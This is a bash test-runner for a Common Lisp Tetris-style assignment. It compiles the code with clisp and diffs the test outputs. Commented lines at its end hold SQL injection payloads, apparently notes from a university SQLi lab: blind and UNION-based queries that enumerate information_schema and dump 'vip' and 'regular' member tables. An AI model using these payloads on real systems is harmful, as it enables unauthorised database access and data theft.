#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'
DIR_TESTS='t'

function run_tests {
	mytime="$( TIMEFORMAT='%lU'; time ( clisp run-test.fas < "${DIR_TESTS}/test$1/input" > "${DIR_TESTS}/test$d/myout" ) 2>&1 1>/dev/null )"	
	if ! diff "${DIR_TESTS}/test$1/output" "${DIR_TESTS}/test$1/myout" ; then
		printf "${RED} Test $1 failed $mytime ${NC}\n"
	else
		printf "${GREEN} Test $1 passed $mytime ${NC}\n"
	fi
	rm -f "${DIR_TESTS}/test$1/myout"	
}

rm -f run-test.fas
sed "1s/^/(defparameter *suppress-check-redefinition* T) (defconstant peca-i0 (make-array (list 4 1) :initial-element T)) (defconstant peca-i1 (make-array (list 1 4) :initial-element T)) (defconstant peca-l0 (make-array (list 3 2) :initial-contents '((T T)(T nil)(T nil)))) (defconstant peca-l1 (make-array (list 2 3) :initial-contents '((T nil nil)(T T T)))) (defconstant peca-l2 (make-array (list 3 2) :initial-contents '((nil T)(nil T)(T T)))) (defconstant peca-l3 (make-array (list 2 3) :initial-contents '((T T T)(nil nil T)))) (defconstant peca-j0 (make-array (list 3 2) :initial-contents '((T T)(nil T)(nil T)))) (defconstant peca-j1 (make-array (list 2 3) :initial-contents '((T T T)(T nil nil)))) (defconstant peca-j2 (make-array (list 3 2) :initial-contents '((T nil)(T nil)(T T)))) (defconstant peca-j3 (make-array (list 2 3) :initial-contents '((nil nil T)(T T T)))) (defconstant peca-o0 (make-array (list 2 2) :initial-element T)) (defconstant peca-s0 (make-array (list 2 3) :initial-contents '((T T nil)(nil T T)))) (defconstant peca-s1 (make-array (list 3 2) :initial-contents '((nil T)(T T)(T nil)))) (defconstant peca-z0 (make-array (list 2 3) :initial-contents '((nil T T)(T T nil)))) (defconstant peca-z1 (make-array (list 3 2) :initial-contents '((T nil)(T T)(nil T)))) (defconstant peca-t0 (make-array (list 2 3) :initial-contents '((T T T)(nil T nil)))) (defconstant peca-t1 (make-array (list 3 2) :initial-contents '((T nil)(T T)(T nil)))) (defconstant peca-t2 (make-array (list 2 3) :initial-contents '((nil T nil)(T T T)))) (defconstant peca-t3 (make-array (list 3 2) :initial-contents '((nil T)(T T)(nil T))))\n/" $1 > run-test.lisp
APPEND="(loop (let ((line (read-line *standard-input* NIL))) (when (not line) (return)) (if (equal #\; (char (string-trim \" \" line) 0)) (format T \"~A~%\" line) (let ((result (multiple-value-list (eval (read-from-string line))))) (format T \"~A\" (first result)) (dolist (other-value (rest result)) (format T \"; ~A\" other-value)) (format T \"~%\")))))"
FILE_NAME="$(cat run-test.lisp)"
echo "$FILE_NAME $APPEND" > run-test.lisp
asciichars="$(grep --color='auto' -P -n "[\x80-\xFF]" run-test.lisp)"
if [ "$asciichars" != "" ]; then
	printf "${RED} The file contains ascii characters in here: ${NC}\n"
	grep --color='auto' -P -n "[\x80-\xFF]" run-test.lisp
else
	compile="$(clisp -q -c run-test.lisp utils.lisp 2>&1 1>/dev/null)"
	if [ "$compile" == "0 errors, 0 warnings" ]; then
		printf "${GREEN} $compile ${NC}\n\n"
		# for d in {00..02} {10..32}; do
		# 	run_tests $d
		# done
		for d in {00..02} {10..35}; do
			run_tests $d
		done
	else
		printf "${RED} $compile ${NC}\n"
	fi
fi
rm -f run-test.lisp
rm -f run-test.fas
rm -f run-test.lib

# +and+ascii(subhash((select length(concat(table_name))+from+information_schema.tables+where+table_schema='inject_3' limit 0,1)>0+

# +and+ascii(subhash((select+concat(table_name)+from+information_schema.tables+where+table_schema={DATABASE_NAME_HEX_ENCODED}+limit+0,1),1,1))>64+

# (ascii(subhash((select concat(table_name) from information_schema.tables where table_schema='inject_3' limit 0,1),1,1)) 
# ascii(subhash((select concat(column_name) from information_schema.columns where table_name='regular'+limit+0,1),1,1))

# https://seclva.ifs.tuwien.ac.at/sqli/sql_level3.php?memberno=1 union select (select length(concat(column_name)) from information_schema.tables where table_schema='inject_3' and table_name='regular' limit 0,1)

# (select length(concat(column_name))+from+information_schema.tables where table_schema='inject_3' and table_name='regular' limit 0,1)

# (select count(*) from information_schema.tables where table_schema='inject_3')>0+

# union select(SELECT group_concat(id, name, memberno) FROM vip) #

# union select (select count(*) from information_schema.columns where table_name=vip)
# union select (select count(*) from information_schema.columns where table_name='vip') #
# union select (select count(*) from information_schema.columns where table_name='regular') #
# union select (select group_concat(id," ",memberno, " ", name) from information_schema.columns where table_name='regular') #

# group_concat(concat_ws(TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME ,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT))

# select group_concat(concat_ws(TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME ,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT)) from information_schema.columns where table_name ='vip' limit 0,1

# memberno=1 union select (select group_concat(" id: ", id," member: ",memberno, "name: ", name) from regular) #
# memberno=1 union select (select group_concat(" id: ", id," member: ",memberno, "name: ", name) from vip) #

# select 1 union select (select group_concat(concat_ws(TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME ,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT)) from information_schema.columns where table_name ='vip') limit 1,1 #

# select 1 union (select (select group_concat(concat_ws(TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME ,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT)) from information_schema.columns where table_name ='vip') limit 1,1) #